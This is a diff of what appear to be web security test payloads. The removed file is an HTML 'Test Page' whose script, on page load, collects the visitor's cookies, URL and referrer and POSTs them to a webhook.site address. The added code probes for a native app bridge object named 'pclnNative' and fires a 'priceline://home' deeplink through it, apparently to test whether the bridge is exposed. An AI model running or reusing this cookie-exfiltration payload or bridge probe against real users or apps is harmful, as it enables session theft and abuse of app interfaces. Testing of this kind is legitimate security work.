@@ -1,48 +1,8 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <title>Test Page</title>
-</head>
-<body>
-  <h1>Loading...</h1>
-  <script>
-    // Get cookies, location, and referrer data
-    var cookies = document.cookie;
-    var loc = window.location.href;
-    var ref = document.referrer;
-
-    // Prepare the data to be sent to the webhook
-    var data = {
-      cookies: cookies,
-      url: loc,
-      referrer: ref
-    };
-
-    // Send the data via a POST request to your webhook
-    fetch('https://webhook.site/11f73cd8-3a3d-4d1a-9e68-a755cdd67f5a', {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json', // Ensuring JSON format
-      },
-      body: JSON.stringify(data), // Send the data as a JSON payload
-      credentials: 'include', // Ensure cookies are included in the request
-      mode: 'cors', // Explicitly set CORS mode
-    })
-    .then(response => {
-      if (!response.ok) {
-        throw new Error('Network response was not ok');
-      }
-      return response.json();
-    })
-    .then(data => {
-      console.log('Request successful:', data);
-    })
-    .catch(error => {
-      console.error('Error sending data:', error);
-    });
-
-    // Update the page content after the fetch completes
-    document.querySelector('h1').innerHTML = 'Page loaded successfully';
-  </script>
-</body>
-</html>
+window.onload = function() {
+    if (window.pclnNative) {
+        pclnNative.publish("deeplink", "priceline://home");
+        document.body.innerHTML = "Bridge exists! Deeplink fired.";
+    } else {
+        document.body.innerHTML = "No bridge found.";
+    }
+}
